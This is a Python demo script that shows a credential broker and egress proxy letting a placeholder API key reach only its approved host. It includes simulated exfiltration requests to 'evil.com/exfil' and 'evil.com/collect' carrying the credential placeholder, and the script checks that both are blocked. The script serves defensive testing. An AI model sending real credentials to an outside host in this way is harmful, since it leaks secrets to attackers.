#!/usr/bin/env python3
"""Demonstrate the credential broker path without exposing a real secret."""

from __future__ import annotations

import json
import logging

from shisad.core.tools.registry import ToolRegistry
from shisad.core.tools.schema import ToolDefinition, ToolParameter
from shisad.core.types import Capability, CredentialRef, ToolName
from shisad.executors.proxy import EgressProxy, NetworkPolicy
from shisad.security.credentials import CredentialConfig, InMemoryCredentialStore
from shisad.security.pep import PEP, PolicyContext
from shisad.security.policy import EgressRule, PolicyBundle

_DEMO_TOOL_NAME = ToolName("demo.http_request")
_DEMO_REF = CredentialRef("demo_openai_key")
_DEMO_SECRET = "sk-demo-real-secret"


def _build_demo_registry() -> ToolRegistry:
    registry = ToolRegistry()
    registry.register(
        ToolDefinition(
            name=_DEMO_TOOL_NAME,
            description="Demo HTTP request with credential_ref support",
            parameters=[
                ToolParameter(name="url", type="string", required=True),
                ToolParameter(name="credential_ref", type="string", required=True),
            ],
            capabilities_required=[Capability.HTTP_REQUEST],
            destinations=["api.good.com", "evil.com"],
        )
    )
    return registry


def _public_resolver(_hostname: str) -> list[str]:
    return ["93.184.216.34"]


def run_demo() -> dict[str, object]:
    store = InMemoryCredentialStore()
    store.register(
        _DEMO_REF,
        _DEMO_SECRET,
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(_DEMO_REF)

    pep = PEP(
        PolicyBundle(
            default_require_confirmation=False,
            egress=[EgressRule(host="api.good.com"), EgressRule(host="evil.com")],
        ),
        _build_demo_registry(),
        credential_store=store,
    )
    policy_context = PolicyContext(capabilities={Capability.HTTP_REQUEST})

    pep_allowed = pep.evaluate(
        _DEMO_TOOL_NAME,
        {
            "url": "https://api.good.com/v1/chat/completions",
            "credential_ref": str(_DEMO_REF),
        },
        policy_context,
    )
    pep_blocked = pep.evaluate(
        _DEMO_TOOL_NAME,
        {
            "url": "https://evil.com/exfil",
            "credential_ref": str(_DEMO_REF),
        },
        policy_context,
    )

    proxy = EgressProxy(credential_store=store, resolver=_public_resolver)
    proxy_allowed = proxy.authorize_request(
        tool_name=str(_DEMO_TOOL_NAME),
        url="https://api.good.com/v1/chat/completions",
        headers={"Authorization": placeholder},
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
        approved_by_pep=True,
    )
    proxy_blocked_host = proxy.authorize_request(
        tool_name=str(_DEMO_TOOL_NAME),
        url="https://evil.com/exfil",
        headers={"Authorization": placeholder},
        policy=NetworkPolicy(allow_network=True, allowed_domains=["evil.com"]),
        approved_by_pep=True,
    )
    proxy_blocked_exfil = proxy.authorize_request(
        tool_name=str(_DEMO_TOOL_NAME),
        url="https://evil.com/collect",
        body=f"dump={placeholder}",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["evil.com"]),
        approved_by_pep=True,
    )

    if pep_allowed.kind.value != "allow":
        raise RuntimeError(f"PEP allowed-host demo failed: {pep_allowed.reason}")
    if pep_blocked.kind.value != "reject" or "credential_ref" not in pep_blocked.reason:
        raise RuntimeError(f"PEP host-mismatch demo failed: {pep_blocked.reason}")
    if not proxy_allowed.allowed:
        raise RuntimeError(f"Proxy allowed-host demo failed: {proxy_allowed.reason}")
    if proxy_allowed.injected_headers.get("Authorization") != _DEMO_SECRET:
        raise RuntimeError("Proxy did not resolve the placeholder for the approved host")
    if proxy_blocked_host.reason != "credential_host_mismatch":
        raise RuntimeError(
            f"Proxy host-mismatch demo failed: expected credential_host_mismatch, got "
            f"{proxy_blocked_host.reason}"
        )
    if proxy_blocked_exfil.reason != "placeholder_exfiltration_blocked":
        raise RuntimeError(
            "Proxy placeholder-exfil demo failed: expected "
            f"placeholder_exfiltration_blocked, got {proxy_blocked_exfil.reason}"
        )

    return {
        "credential_ref": str(_DEMO_REF),
        "placeholder": placeholder,
        "pep_allowed": {
            "decision": pep_allowed.kind.value,
            "attempt_reason": pep.credential_attempts[0].reason,
            "destination_host": pep.credential_attempts[0].destination_host,
        },
        "pep_blocked_host": {
            "decision": pep_blocked.kind.value,
            "reason": pep_blocked.reason,
            "attempt_reason": pep.credential_attempts[1].reason,
            "destination_host": pep.credential_attempts[1].destination_host,
        },
        "proxy_allowed": {
            "allowed": proxy_allowed.allowed,
            "reason": proxy_allowed.reason,
            "destination_host": proxy_allowed.destination_host,
            "used_placeholders": list(proxy_allowed.used_placeholders),
            "authorization_header": "<resolved-secret>",
        },
        "proxy_blocked_host": {
            "allowed": proxy_blocked_host.allowed,
            "reason": proxy_blocked_host.reason,
            "destination_host": proxy_blocked_host.destination_host,
            "used_placeholders": list(proxy_blocked_host.used_placeholders),
        },
        "proxy_blocked_exfil": {
            "allowed": proxy_blocked_exfil.allowed,
            "reason": proxy_blocked_exfil.reason,
            "destination_host": proxy_blocked_exfil.destination_host,
            "used_placeholders": list(proxy_blocked_exfil.used_placeholders),
        },
        "note": (
            "The placeholder is the only credential-like value exposed outside the broker; "
            "the real secret is resolved only for the approved host and is never printed."
        ),
    }


def main() -> int:
    logging.getLogger("shisad.security.credentials").setLevel(logging.ERROR)
    print(json.dumps(run_demo(), indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
